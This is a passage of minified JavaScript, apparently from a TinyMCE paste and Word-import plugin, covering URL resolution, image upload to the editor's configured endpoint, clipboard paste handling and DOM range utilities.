                return j(Zo, n) ? t + "." + n : t
              }
              return t
            })(e, t)
      },
      buildData: function (e, t, n) {
        var r = new g.FormData()
        return r.append(e, t, n), r
      },
    },
    ei = function (e) {
      var t = ""
      return (
        "" !== e.protocol && ((t += e.protocol), (t += ":")),
        "" !== e.authority && ((t += "//"), (t += e.authority)),
        (t += e.path),
        "" !== e.query && ((t += "?"), (t += e.query)),
        "" !== e.anchor && ((t += "#"), (t += e.anchor)),
        t
      )
    },
    ti = Object.prototype.hasOwnProperty,
    ni =
      ((ko = function (e, t) {
        return t
      }),
      function () {
        for (var e = new Array(arguments.length), t = 0; t < e.length; t++)
          e[t] = arguments[t]
        if (0 === e.length) throw new Error("Can't merge zero objects")
        for (var n = {}, r = 0; r < e.length; r++) {
          var o = e[r]
          for (var i in o) ti.call(o, i) && (n[i] = ko(n[i], o[i]))
        }
        return n
      }),
    ri = {
      strictMode: !1,
      key: [
        "source",
        "protocol",
        "authority",
        "userInfo",
        "user",
        "password",
        "host",
        "port",
        "relative",
        "path",
        "directory",
        "file",
        "query",
        "anchor",
      ],
      q: {
        name: "queryKey",
        parser: /(?:^|&)([^&=]*)=?([^&]*)/g,
      },
      parser: {
        strict:
          /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@\/]*)(?::([^:@\/]*))?)?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
        loose:
          /^(?:(?![^:@\/]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@\/]*)(?::([^:@\/]*))?)?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/,
      },
    },
    oi = function (e, t) {
      return (function (e, t) {
        for (
          var r = t,
            n = r.parser[r.strictMode ? "strict" : "loose"].exec(e),
            o = {},
            i = 14;
          i--;

        )
          o[r.key[i]] = n[i] || ""
        return (
          (o[r.q.name] = {}),
          o[r.key[12]].replace(r.q.parser, function (e, t, n) {
            t && (o[r.q.name][t] = n)
          }),
          o
        )
      })(e, ni(ri, t))
    },
    ii = function (e) {
      return Qr(e, ai(e))
    },
    ai = function (e) {
      return e.substring(e.lastIndexOf("/"))
    },
    ui = function (e) {
      for (var t = e, n = ""; "" !== t; )
        if (to(t, "../")) t = Zr(t, "../")
        else if (to(t, "./")) t = Zr(t, "./")
        else if (to(t, "/./")) t = "/" + Zr(t, "/./")
        else if ("/." === t) t = "/"
        else if (to(t, "/../")) (t = "/" + Zr(t, "/../")), (n = ii(n))
        else if ("/.." === t) (t = "/"), (n = ii(n))
        else if ("." === t || ".." === t) t = ""
        else {
          var r = t.match(/(^\/?.*?)(\/|$)/)[1]
          ;(t = Zr(t, r)), (n += r)
        }
      return n
    },
    ci = function (e, t, n) {
      if ("" !== n && "" === e) return "/" + t
      var r = e.substring(e.lastIndexOf("/") + 1)
      return Qr(e, r) + t
    },
    si = function (e, t) {
      var n = {
          strictMode: !0,
        },
        r = oi(e, n),
        o = oi(t, n),
        i = {}
      return (
        "" !== o.protocol
          ? ((i.protocol = o.protocol),
            (i.authority = o.authority),
            (i.path = ui(o.path)),
            (i.query = o.query))
          : ("" !== o.authority
              ? ((i.authority = o.authority),
                (i.path = ui(o.path)),
                (i.query = o.query))
              : ("" === o.path
                  ? ((i.path = r.path),
                    "" !== o.query ? (i.query = o.query) : (i.query = r.query))
                  : (to(o.path, "/")
                      ? (i.path = ui(o.path))
                      : ((i.path = ci(r.path, o.path, e.authority)),
                        (i.path = ui(i.path))),
                    (i.query = o.query)),
                (i.authority = r.authority)),
            (i.protocol = r.protocol)),
        (i.anchor = o.anchor),
        i
      )
    },
    fi = function (e, t) {
      var n = si(e, t)
      return ei(n)
    }
  function li(i) {
    var e,
      t,
      n,
      r,
      d =
        ((e = i.url),
        (t = e.lastIndexOf("/")),
        (n = 0 < t ? e.substr(0, t) : e),
        (r = void 0 === i.basePath ? n : i.basePath),
        no(r, "/") ? r : r + "/"),
      o = function (e, t, f) {
        var n,
          r,
          l = Qo.getFilename(e, t),
          o =
            ((n = Qo.buildData("image", e, l).get("image")),
            {
              type: gr.Blob,
              data: n,
            })
        ;((r = {
          url: i.url,
          body: o,
          responseType: gr.Text,
          credentials: !0 === i.credentials,
        }),
        zo(
          oe(oe({}, r), {
            method: "post",
          })
        )).get(function (e) {
          e.fold(
            function (e) {
              f(Fo.error(Qo.failureObject(e.message, e.status, e.responseText)))
            },
            function (t) {
              var n, e, r, o
              try {
                var i = JSON.parse(t)
                if (!C(i.location))
                  return (
                    (e = "JSON response did not contain a string location"),
                    (r = 500),
                    (o = t),
                    void f(Fo.error(Qo.failureObject(e, r, o)))
                  )
                n = i.location
              } catch (e) {
                n = t
              }
              var a,
                u,
                c,
                s =
                  ((a = l),
                  (u = n.split(/\s+/)),
                  (c = 1 === u.length && "" !== u[0] ? u[0] : a),
                  fi(d, c))
              f(
                Fo.value({
                  location: s,
                })
              )
            }
          )
        })
      }
    return {
      upload: function (e, t, n) {
        var r = e.imageresult()
        $e(r).then(function (e) {
          o(e, t, n)
        })
      },
    }
  }
  sr("id", "filename", "blob", "base64")
  var di = function (e) {
      return li(e)
    },
    mi = de([
      {
        blob: ["id", "imageresult", "objurl"],
      },
      {
        url: ["id", "url", "raw"],
      },
    ]),
    pi = ni(mi, {
      cata: function (e, t, n) {
        return e.fold(t, n)
      },
    }),
    gi = function (e, t) {
      var n = mt(e, t)
      return void 0 === n || "" === n ? [] : n.split(" ")
    },
    vi = function (e) {
      return void 0 !== e.dom().classList
    },
    hi = function (e) {
      return gi(e, "class")
    },
    yi = function (e, t) {
      return (
        (o = t),
        (i = gi((n = e), (r = "class")).concat([o])),
        lt(n, r, i.join(" ")),
        !0
      )
      var n, r, o, i
    },
    bi = function (e, t) {
      return (
        (o = t),
        0 <
        (i = H(gi((n = e), (r = "class")), function (e) {
          return e !== o
        })).length
          ? lt(n, r, i.join(" "))
          : gt(n, r),
        !1
      )
      var n, r, o, i
    },
    Ti = function (e, t) {
      vi(e) ? e.dom().classList.add(t) : yi(e, t)
    },
    xi = function (e, t) {
      var n
      vi(e) ? e.dom().classList.remove(t) : bi(e, t)
      0 === (vi((n = e)) ? n.dom().classList : hi(n)).length && gt(n, "class")
    },
    Ei = function (e, t) {
      return vi(e) && e.dom().classList.contains(t)
    },
    wi = function (t, e) {
      Y(e, function (e) {
        Ti(t, e)
      })
    },
    Si = function (e) {
      return vi(e)
        ? (function (e) {
            for (
              var t = e.dom().classList, n = new Array(t.length), r = 0;
              r < t.length;
              r++
            )
              n[r] = t.item(r)
            return n
          })(e)
        : hi(e)
    },
    Ii = function (t) {
      return function (e) {
        return Ei(e, t)
      }
    }
  var Li = function (e, t, n) {
      for (var r = e.dom(), o = A(n) ? n : y(!1); r.parentNode; ) {
        r = r.parentNode
        var i = ht.fromDom(r)
        if (t(i)) return N.some(i)
        if (o(i)) break
      }
      return N.none()
    },
    Ni = function (e, t) {
      return $(e.dom().childNodes, function (e) {
        return t(ht.fromDom(e))
      }).map(ht.fromDom)
    },
    _i = function (e, o) {
      var i = function (e) {
        for (var t = 0; t < e.childNodes.length; t++) {
          var n = ht.fromDom(e.childNodes[t])
          if (o(n)) return N.some(n)
          var r = i(e.childNodes[t])
          if (r.isSome()) return r
        }
        return N.none()
      }
      return i(e.dom())
    },
    Ci = function (e, t, n) {
      return Li(
        e,
        function (e) {
          return po(e, t)
        },
        n
      )
    },
    Oi = function (e, t) {
      return (
        (n = t),
        (o = void 0 === (r = e) ? g.document : r.dom()),
        go(o) ? N.none() : N.from(o.querySelector(n)).map(ht.fromDom)
      )
      var n, r, o
    },
    Di = function (e, t, n) {
      return (
        (r = Ci),
        (a = n),
        po((o = e), (i = t)) ? N.some(o) : A(a) && a(o) ? N.none() : r(o, i, a)
      )
      var r, o, i, a
    },
    Pi = sr("image", "blobInfo"),
    Ai = de([
      {
        failure: ["error"],
      },
      {
        success: ["result", "images", "blob"],
      },
    ]),
    ki = function (e, t, n, r, o) {
      var i = Xe(n),
        a = e.lookupByData(i).getOrThunk(function () {
          return e.add(t, n, r)
        })
      return lt(o, Lr.blobId(), a.id()), Pi(o, a)
    },
    Mi = function (t, n) {
      return t.get(n).fold(
        function () {
          return Fo.error("Internal error with blob cache")
        },
        function (e) {
          return t.remove(n), Fo.value(e)
        }
      )
    },
    Ri = function (e, t, n) {
      var r = e.isActive(t)
      return (
        e.register(n, t), Ti(n, Lr.uploadInProgress()), r ? N.none() : N.some(t)
      )
    },
    Fi = function (e, n, a, r, u, t, c) {
      var s = function () {
        g.console.error("Internal error with blob cache", u),
          c(
            Ai.failure({
              status: y(666),
            })
          )
      }
      e.upload(t, u, function (e) {
        var t,
          i = n.findById(r, u)
        Y(
          i,
          ((t = Lr.uploadInProgress()),
          function (e) {
            xi(e, t)
          })
        ),
          e.fold(
            function (e) {
              c(Ai.failure(e))
            },
            function (t) {
              var e, n, r, o
              ;((e = a),
              (n = i),
              (r = u),
              (o = t),
              Y(n, function (e) {
                lt(e, "src", o.location), gt(e, Lr.blobId())
              }),
              Mi(e, r)).fold(s, function (e) {
                c(Ai.success(t, i, e))
              })
            }
          ),
          n.report(u, i, e.isValue())
      })
    },
    ji = function (o, i, e) {
      return G(e, function (e) {
        return pi.cata(
          e,
          function (t, n, r) {
            return Oi(i, 'img[src="' + r + '"]').fold(
              function () {
                return [
                  Fo.error(
                    "Image that was just inserted could not be found: " + r
                  ),
                ]
              },
              function (e) {
                return [Fo.value(ki(o, t, n, r, e))]
              }
            )
          },
          y([])
        )
      })
    },
    Ui = function (e, o, t) {
      var n = e.findAll(t)
      return e.inProgress()
        ? []
        : B(n, function (e) {
            return (
              (t = o),
              (r = mt((n = e), Lr.blobId())),
              t.get(r).fold(
                function () {
                  return Fo.error(r)
                },
                function (e) {
                  return Fo.value(Pi(n, e))
                }
              )
            )
            var t, n, r
          })
    },
    Bi = function (e) {
      return parseInt(e, 10)
    },
    Yi = function (e, t, n) {
      return {
        major: y(e),
        minor: y(t),
        patch: y(n),
      }
    },
    Wi = {
      getTinymceVersion: function () {
        var e,
          t,
          n = [tinymce.majorVersion, tinymce.minorVersion].join(".")
        return (
          (e = n.split(".").slice(0, 3).join(".")),
          (t = /([0-9]+)\.([0-9]+)\.([0-9]+)(?:(\-.+)?)/.exec(e))
            ? Yi(Bi(t[1]), Bi(t[2]), Bi(t[3]))
            : Yi(0, 0, 0)
        )
      },
    }
  function Hi(c) {
    var s = function (e, t) {
      return y(
        4 === (o = Wi.getTinymceVersion()).major() && o.minor() < 6
          ? e
          : e +
              "." +
              ((n = t.toLowerCase()),
              (r = {
                "image/jpeg": "jpg",
                "image/jpg": "jpg",
                "image/gif": "gif",
                "image/png": "png",
              }).hasOwnProperty(n)
                ? r[n]
                : "dat")
      )
      var n, r, o
    }
    return {
      importImages: function (e) {
        var t = G(e, function (e) {
          return pe.cata(
            e,
            function (e, t, n) {
              var r,
                o,
                i,
                a,
                u = Xe(t)
              return [
                ((r = e),
                (o = t),
                (i = u),
                (a = n),
                Ee.nu(function (t) {
                  Ve(o).then(function (e) {
                    c.editorUpload.blobCache.add({
                      id: y(r),
                      name: y(r),
                      filename: s(r, e.type),
                      blob: y(e),
                      base64: y(i.split(",")[1]),
                      blobUri: y(a),
                      uri: y(null),
                    }),
                      t(e)
                  })
                })),
              ]
            },
            y([])
          )
        })
        return Se(t)
      },
      uploadImages: function () {
        c.uploadImages()
      },
      prepareImages: L,
      getLocalURL: function (e, t, n) {
        return Xe(t)
      },
    }
  }
  var qi = function (e, t) {
      var n = (t || g.document).createElement("div")
      return (n.innerHTML = e), Io(ht.fromDom(n))
    },
    $i = function (t, n) {
      To(t).each(function (e) {
        e.dom().insertBefore(n.dom(), t.dom())
      })
    },
    Vi = function (e, t) {
      wo(e).fold(
        function () {
          To(e).each(function (e) {
            Gi(e, t)
          })
        },
        function (e) {
          $i(e, t)
        }
      )
    },
    Xi = function (t, n) {
      Lo(t).fold(
        function () {
          Gi(t, n)
        },
        function (e) {
          t.dom().insertBefore(n.dom(), e.dom())
        }
      )
    },
    Gi = function (e, t) {
      e.dom().appendChild(t.dom())
    },
    Ki = function (e, t) {
      $i(e, t), Gi(t, e)
    },
    zi = function (r, o) {
      Y(o, function (e, t) {
        var n = 0 === t ? r : o[t - 1]
        Vi(n, e)
      })
    },
    Ji = function (t, e) {
      Y(e, function (e) {
        Gi(t, e)
      })
    },
    Zi = function (e) {
      xi(e, Lr.uploadInProgress())
    },
    Qi = function (e) {
      for (var t = 0; t < e.undoManager.data.length; t++) {
        var n = e.undoManager.data[t].content,
          r = ht.fromTag("div")
        Ji(r, qi(n))
        var o = Co(r, "." + Lr.uploadInProgress())
        Y(o, Zi), (e.undoManager.data[t].content = r.dom().innerHTML)
      }
    },
    ea = function (e, t, n) {
      for (var r = 0; r < e.undoManager.data.length; r++)
        e.undoManager.data[r].content = e.undoManager.data[r].content
          .split(t.objurl())
          .join(n.location)
    },
    ta = {
      showDialog: function (e, t) {
        var n,
          r = {
            title: "Error",
            spacing: 10,
            padding: 10,
            items: [
              {
                type: "container",
                html: t,
              },
            ],
            buttons: [
              {
                text: "Ok",
                onclick: function () {
                  n.close()
                },
              },
            ],
          }
        n = e.windowManager.open(r)
      },
    },
    na = function (r, e) {
      var o,
        t,
        i,
        a,
        u,
        n,
        c = pr(),
        s = Ao(),
        f =
          ((o = r),
          (t = e.url),
          (i = ta),
          (a = function () {
            return (
              bt.translate("error.code.images.not.found") +
              t +
              bt.translate("error.full.stop")
            )
          }),
          (u = function () {
            return (
              bt.translate("error.imageupload") +
              t +
              bt.translate("error.full.stop")
            )
          }),
          (n = function (e) {
            var t = e.status(),
              n = 0 === t || 400 <= t || t < 500 ? a : u
            i.showDialog(o, n())
          }),
          {
            instance: function () {
              return (
                (e = n),
                (t = !1),
                function () {
                  t || ((t = !0), e.apply(null, arguments))
                }
              )
              var e, t
            },
          }),
        l = di(e),
        d = function () {
          return ht.fromDom(r.getBody())
        },
        m = function (t, e, n) {
          Y(e, function (e) {
            lt(e, "data-mce-src", t.location)
          }),
            ea(r, n, t)
        }
      s.events.complete.bind(function (e) {
        Qi(r)
      })
      var p = function (o, i) {
        Ri(s, o.blobInfo().id(), o.image()).each(function (e) {
          var t, n, r
          ;(t = e),
            (n = o.blobInfo()),
            (r = i),
            Fi(l, s, c, d(), t, n, function (e) {
              e.fold(function (e) {
                r(e)
              }, m)
            })
        })
      }
      return {
        importImages: function () {
          return Ee.pure([])
        },
        uploadImages: function (e) {
          var t, n, r, o, i
          ;(t = f.instance()),
            (n = Ui(s, c, d())),
            Y(n, function (e) {
              e.fold(
                function (e) {
                  s.report(e, N.none(), !1)
                },
                function (e) {
                  p(e, t)
                }
              )
            }),
            (r = e),
            (o = f.instance()),
            (i = ji(c, d(), r)),
            Y(i, function (e) {
              e.fold(
                function (e) {
                  console.error(e)
                },
                function (e) {
                  p(e, o)
                }
              )
            })
        },
        prepareImages: L,
        getLocalURL: function (e, t, n) {
          return n
        },
      }
    },
    ra = function (o) {
      var e = Hi(o)
      return {
        importImages: function () {
          return Ee.pure([])
        },
        uploadImages: L,
        prepareImages: function (e) {
          Y(e, function (e) {
            pe.cata(
              e,
              function (e, t, n) {
                var r = Xe(t)
                Y(o.dom.select('img[src="' + n + '"]'), function (e) {
                  o.dom.setAttrib(e, "src", r)
                })
              },
              L
            )
          })
        },
        getLocalURL: e.getLocalURL,
      }
    }
  function oa(e) {
    return void 0 !== e.uploadImages
      ? Hi(e)
      : (function (e) {
          if (J(e)) {
            var t = {
              url: e.settings.images_upload_url,
              basePath: e.settings.images_upload_base_path,
              credentials: e.settings.images_upload_credentials,
            }
            return na(e, t)
          }
          return ra(e)
        })(e)
  }
  var ia = function (t, r, e, n) {
      var o,
        i,
        a,
        u,
        c,
        s = t.selection,
        f = t.dom,
        l = t.getBody()
      if (
        ((c = e.isText()),
        e.reset(),
        n.clipboardData && n.clipboardData.getData("text/html"))
      ) {
        n.preventDefault()
        var d = n.clipboardData.getData("text/html"),
          m = d.match(/<html[\s\S]+<\/html>/i),
          p = null === m ? d : m[0]
        return r(p)
      }
      if (!f.get("_mcePaste")) {
        if (
          ((o = f.add(
            l,
            "div",
            {
              id: "_mcePaste",
              class: "mcePaste",
            },
            '\ufeff<br _mce_bogus="1">'
          )),
          (u =
            l !== t.getDoc().body
              ? f.getPos(t.selection.getStart(), l).y
              : l.scrollTop),
          f.setStyles(o, {
            position: "absolute",
            left: -1e4,
            top: u,
            width: 1,
            height: 1,
            overflow: "hidden",
          }),
          tinymce.isIE)
        )
          return (
            (a = f.doc.body.createTextRange()).moveToElementText(o),
            a.execCommand("Paste"),
            f.remove(o),
            "\ufeff" === o.innerHTML
              ? (t.execCommand("mcePasteWord"), void n.preventDefault())
              : (r(c ? o.innerText : o.innerHTML), tinymce.dom.Event.cancel(n))
          )
        var g = function (e) {
          e.preventDefault()
        }
        if (
          (f.bind(t.getDoc(), "mousedown", g),
          f.bind(t.getDoc(), "keydown", g),
          tinymce.isGecko &&
            (a = t.selection.getRng(!0)).startContainer === a.endContainer &&
            3 === a.startContainer.nodeType)
        ) {
          var v = f.select("p,h1,h2,h3,h4,h5,h6,pre", o)
          1 === v.length && f.remove(v.reverse(), !0)
        }
        ;(i = t.selection.getRng()),
          (o = o.firstChild),
          (a = t.getDoc().createRange()).setStart(o, 0),
          a.setEnd(o, 1),
          s.setRng(a),
          window.setTimeout(function () {
            var n = "",
              e = f.select("div.mcePaste")
            xt.each(e, function (e) {
              var t = e.firstChild
              t &&
                "DIV" === t.nodeName &&
                t.style.marginTop &&
                t.style.backgroundColor &&
                f.remove(t, 1),
                xt.each(f.select("div.mcePaste", e), function (e) {
                  f.remove(e, 1)
                }),
                xt.each(f.select("span.Apple-style-span", e), function (e) {
                  f.remove(e, 1)
                }),
                xt.each(f.select("br[_mce_bogus]", e), function (e) {
                  f.remove(e)
                }),
                (n += e.innerHTML)
            }),
              xt.each(e, function (e) {
                f.remove(e)
              }),
              i && s.setRng(i),
              r(n),
              f.unbind(t.getDoc(), "mousedown", g),
              f.unbind(t.getDoc(), "keydown", g)
          }, 0)
      }
    },
    aa = {
      getOnPasteFunction: function (t, n, r) {
        return function (e) {
          ia(t, n, r, e)
        }
      },
      getOnKeyDownFunction: function (t, n, r) {
        return function (e) {
          ;(tinymce.isOpera || 0 < navigator.userAgent.indexOf("Firefox/2")) &&
            (((tinymce.isMac ? e.metaKey : e.ctrlKey) && 86 === e.keyCode) ||
              (e.shiftKey && 45 === e.keyCode)) &&
            ia(t, n, r, e)
        }
      },
    }
  function ua() {
    var o = {}
    return {
      getOrSetIndexed: function (e, t) {
        return void 0 !== o[e] ? o[e] : ((n = e), (r = t()), (o[n] = r))
        var n, r
      },
      waitForLoad: function () {
        var e = fe(o)
        return Se(e)
      },
    }
  }
  var ca = function (u) {
      var c = b(rt, u)
      rt("callbacks", c())
      var t = function (e, t) {
          var n,
            r,
            o,
            i = c(),
            a =
              ((r = void 0 === (n = i).count ? 0 : n.count),
              (o = "callback_" + r),
              (n.count = r + 1),
              o)
          return (
            (i.callbacks[a] = function () {
              t || s(a), e.apply(null, arguments)
            }),
            u + ".callbacks." + a
          )
        },
        s = function (e) {
          var t = e.substring(e.lastIndexOf(".") + 1),
            n = c()
          void 0 !== n.callbacks[t] && delete n.callbacks[t]
        }
      return {
        ephemeral: function (e) {
          return t(e, !1)
        },
        permanent: function (e) {
          return t(e, !0)
        },
        unregister: s,
      }
    },
    sa = function (e) {
      var t,
        n,
        r,
        o,
        i,
        a,
        u,
        c = ht.fromDom(e.target),
        s = function () {
          e.stopPropagation()
        },
        f = function () {
          e.preventDefault()
        },
        l = d(f, s)
      return (
        (t = c),
        (n = e.clientX),
        (r = e.clientY),
        (o = s),
        (i = f),
        (a = l),
        (u = e),
        {
          target: y(t),
          x: y(n),
          y: y(r),
          stop: o,
          prevent: i,
          kill: a,
          raw: y(u),
        }
      )
    },
    fa = function (e, t, n, r, o) {
      var i,
        a,
        u =
          ((i = n),
          (a = r),
          function (e) {
            i(e) && a(sa(e))
          })
      return (
        e.dom().addEventListener(t, u, o),
        {
          unbind: b(la, e, t, u, o),
        }
      )
    },
    la = function (e, t, n, r) {
      e.dom().removeEventListener(t, n, r)
    },
    da = y(!0),
    ma = function (e, t, n) {
      return fa(e, t, da, n, !1)
    },
    pa = ca("ephox.henchman.features"),
    ga = function (i) {
      return be.nu(function (t) {
        var e = function () {
            r.unbind(), o.unbind()
          },
          n = ht.fromTag("script")
        lt(n, "src", i),
          lt(n, "type", "text/javascript"),
          lt(n, "async", "async"),
          lt(
            n,
            "data-main",
            pa.ephemeral(function (e) {
              t(Fo.value(e))
            })
          )
        var r = ma(n, "error", function () {
            e(), t(Fo.error("Error loading external script tag " + i))
          }),
          o = ma(n, "load", e)
        Gi(ht.fromDom(g.document.head), n)
      })
    },
    va = function (e, t) {
      var n,
        r,
        o,
        i = t || ht.fromDom(g.document),
        a = ht.fromTag("link", i.dom())
      return (
        dt(a, {
          rel: "stylesheet",
          type: "text/css",
          href: e,
        }),
        (n = i),
        (r = a),
        (o = ht.fromDom(n.dom().head)),
        Gi(o, r),
        a
      )
    },
    ha = function (o, i) {
      return be.nu(function (t) {
        var n = function (e) {
            Y(r, function (e) {
              e.unbind()
            }),
              t(
                e.fold(function (e) {
                  return Fo.error(
                    e + 'Unable to download editor stylesheets from "' + o + '"'
                  )
                }, Fo.value)
              )
          },
          e = va(o),
          r = [
            ma(e, "load", function (e) {
              !(function (e) {
                try {
                  var t = e.target().dom().sheet.cssRules
                  return O(t) && 0 === t.length
                } catch (e) {}
                return !1
              })(e)
                ? i(n)
                : n(Fo.error(""))
            }),
            ma(e, "error", b(n, Fo.error(""))),
          ]
      })
    }
  var ya,
    ba,
    Ta =
      ((ya = ua()),
      {
        preload: function () {
          ba().get(a)
        },
        addStylesheet: function (e, t) {
          return ya.getOrSetIndexed(e, function () {
            return ha(e, t)
          })
        },
        addScript: function (e, t) {
          return ya.getOrSetIndexed(e, function () {
            return ga(e).map(t)
          })
        },
        waitForLoad: (ba = function () {
          return ya.waitForLoad()
        }),
      }),
    xa = function (e, t) {
      return Ta.addScript(e, t)
    },
    Ea = fo(),
    wa = Ea.deviceType.isiOS() || Ea.deviceType.isAndroid(),
    Sa = y({
      isSupported: y(!1),
      cleanDocument: y(Ho("not supported")),
    }),
    Ia = wa
      ? Sa
      : function (e, t) {
          var n,
            r =
              e +
              "/wordimport.js" +
              ((n = t || "v=5.2.4"),
              N.from(n)
                .filter(function (e) {
                  return 0 !== e.length
                })
                .map(function (e) {
                  return (-1 === e.indexOf("?") ? "?" : "") + e
                })
                .getOr("")),
            o = xa(r, a)
          o.get(function (e) {
            e.fold(function (e) {
              g.console.error("Unable to load word import: ", e)
            }, L)
          })
          return {
            isSupported: y(!0),
            cleanDocument: function (t, n, r) {
              return o.map(function (e) {
                return e.map(function (e) {
                  return e.cleanDocument(t, n, r.cleanFilteredInlineElements)
                })
              })
            },
          }
        },
    La = function (e) {
      ;(e.dom().textContent = ""),
        Y(Io(e), function (e) {
          Na(e)
        })
    },
    Na = function (e) {
      var t = e.dom()
      null !== t.parentNode && t.parentNode.removeChild(t)
    },
    _a = function (e) {
      var t,
        n = Io(e)
      0 < n.length &&
        ((t = e),
        Y(n, function (e) {
          $i(t, e)
        })),
        Na(e)
    }
  function Ca(e, t, n, r) {
    var o = ho(e, n) && t === r
    return {
      startContainer: y(e),
      startOffset: y(t),
      endContainer: y(n),
      endOffset: y(r),
      collapsed: y(o),
    }
  }
  var Oa,
    Da,
    Pa = function () {
      var e = !1
      return {
        isBlocked: function () {
          return e
        },
        block: function () {
          e = !0
        },
        unblock: function () {
          e = !1
        },
      }
    },
    Aa = function (e, t) {
      return {
        control: e,
        instance: t,
      }
    },
    ka = {
      tap: function (n) {
        var r = Pa()
        return Aa(r, function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t]
          r.isBlocked() || n.apply(null, e)
        })
      },
    },
    Ma = fo(),
    Ra = Ma.browser.isIE() && Ma.browser.version.major <= 10,
    Fa = Ra
      ? function (e, t, n) {
          t.control.block(),
            e.dom().execCommand("paste"),
            n(),
            t.control.unblock()
        }
      : function (e, t, n) {
          setTimeout(n, 1)
        },
    ja = {
      willBlock: y(Ra),
      run: function (e, t, n) {
        return Fa(e, t, n)
      },
    },
    Ua = ["b", "i", "u", "sub", "sup", "strike"],
    Ba = function (e) {
      Y(Io(e), function (e) {
        var t
        ct((t = e)) && !t.dom().hasChildNodes() && j(Ua, ot(t)) && Na(e)
      })
    },
    Ya = function (e, o) {
      var t = Io(e)
      Y(t, function (e) {
        var t, n, r
        o(e) &&
          ((n = Io((t = e))),
          (r = ht.fromTag("div", bo(t).dom())),
          Ji(r, n),
          $i(t, r),
          Na(t))
      })
    },
    Wa = {
      consolidate: function (n, e) {
        wo(n)
          .filter(e)
          .each(function (e) {
            var t = Io(e)
            Ji(n, t), Na(e)
          }),
          Ya(n, e),
          Ba(n)
      },
    },
    Ha = {
      resolve: xr("ephox-sloth").resolve,
    }.resolve("bin"),
    qa = {
      bin: y(Ha),
    },
    $a = function (e) {
      return void 0 !== e.style && A(e.style.getPropertyValue)
    },
    Va = function (e, t, n) {
      if (!C(n))
        throw (
          (g.console.error(
            "Invalid call to CSS.set. Property ",
            t,
            ":: Value ",
            n,
            ":: Element ",
            e
          ),
          new Error("CSS value must be a string: " + n))
        )
      $a(e) && e.style.setProperty(t, n)
    },
    Xa = function (e, t, n) {
      var r = e.dom()
      Va(r, t, n)
    },
    Ga = function (e, t) {
      var n = e.dom()
      ae(t, function (e, t) {
        Va(n, t, e)
      })
    },
    Ka = function (e, t) {
      var n = e.dom(),
        r = g.window.getComputedStyle(n).getPropertyValue(t),
        o = "" !== r || _r(e) ? r : za(n, t)
      return null === o ? void 0 : o
    },
    za = function (e, t) {
      return $a(e) ? e.style.getPropertyValue(t) : ""
    },
    Ja = function (e, t) {
      var n = e.dom(),
        r = za(n, t)
      return N.from(r).filter(function (e) {
        return 0 < e.length
      })
    },
    Za = function (e, t) {
      var n,
        r,
        o = e.dom()
      ;(r = t),
        $a((n = o)) && n.style.removeProperty(r),
        pt(e, "style") && "" === ro(mt(e, "style")) && gt(e, "style")
    },
    Qa = function (e) {
      return "rtl" === Ka(e, "direction") ? "rtl" : "ltr"
    },
    eu = function (e) {
      return e.dom().innerHTML
    },
    tu = function (e, t) {
      var n = bo(e).dom(),
        r = ht.fromDom(n.createDocumentFragment()),
        o = qi(t, n)
      Ji(r, o), La(e), Gi(e, r)
    },
    nu = qa.bin(),
    ru = nu + _e(""),
    ou =
      ((Oa = "-100000px"),
      (Da = "100000px"),
      function (e) {
        return "rtl" === Qa(e) ? Da : Oa
      })
  function iu(t, e, n) {
    var r = (function (t, e) {
        var n = ht.fromTag("div")
        dt(n, e),
          dt(n, {
            contenteditable: "true",
            "aria-hidden": "true",
          }),
          Ga(n, {
            position: "fixed",
            top: "0px",
            width: "100px",
            height: "100px",
            overflow: "hidden",
            opacity: "0",
          }),
          wi(n, [nu, ru])
        var r = function (e) {
          return Ei(e, ru)
        }
        return {
          attach: function (e) {
            La(n), Xa(n, "left", ou(e)), Gi(e, n)
          },
          focus: function () {
            Ci(n, "body").each(function (e) {
              t.toOff(e, n)
            })
          },
          contents: function () {
            return (
              Wa.consolidate(n, r),
              sr("elements", "html", "container")(Io(n), eu(n), n)
            )
          },
          container: function () {
            return n
          },
          detach: function () {
            Na(n)
          },
        }
      })(t, n),
      o = function () {
        t.cleanup()
        var e = r.contents()
        r.detach(), a.trigger.after(e.elements(), e.html(), r.container())
      },
      i = ka.tap(function () {
        a.trigger.before(), r.attach(e), r.focus(), ja.run(bo(e), i, o)
      }),
      a = yr.create({
        before: hr([]),
        after: hr(["elements", "html", "container"]),
      }),
      u = L
    return {
      instance: y(function () {
        i.instance()
      }),
      destroy: u,
      events: a.registry,
    }
  }
  var au = function (e, t, n) {
      var r,
        o,
        i = e.document.createRange()
      return (
        (r = i),
        t.fold(
          function (e) {
            r.setStartBefore(e.dom())
          },
          function (e, t) {
            r.setStart(e.dom(), t)
          },
          function (e) {
            r.setStartAfter(e.dom())
          }
        ),
        (o = i),
        n.fold(
          function (e) {
            o.setEndBefore(e.dom())
          },
          function (e, t) {
            o.setEnd(e.dom(), t)
          },
          function (e) {
            o.setEndAfter(e.dom())
          }
        ),
        i
      )
    },
    uu = function (e, t, n, r, o) {
      var i = e.document.createRange()
      return i.setStart(t.dom(), n), i.setEnd(r.dom(), o), i
    },
    cu = de([
      {
        ltr: ["start", "soffset", "finish", "foffset"],
      },
      {
        rtl: ["start", "soffset", "finish", "foffset"],
      },
    ]),
    su = function (e, t, n) {
      return t(
        ht.fromDom(n.startContainer),
        n.startOffset,
        ht.fromDom(n.endContainer),
        n.endOffset
      )
    },
    fu = function (e, t) {
      var o,
        n,
        r,
        i =
          ((o = e),
          t.match({
            domRange: function (e) {
              return {
                ltr: y(e),
                rtl: N.none,
              }
            },
            relative: function (e, t) {
              return {
                ltr: Nr(function () {
                  return au(o, e, t)
                }),
                rtl: Nr(function () {
                  return N.some(au(o, t, e))
                }),
              }
            },
            exact: function (e, t, n, r) {
              return {
                ltr: Nr(function () {
                  return uu(o, e, t, n, r)
                }),
                rtl: Nr(function () {
                  return N.some(uu(o, n, r, e, t))
                }),
              }
            },
          }))
      return (r = (n = i).ltr()).collapsed
        ? n
            .rtl()
            .filter(function (e) {
              return !1 === e.collapsed
            })
            .map(function (e) {
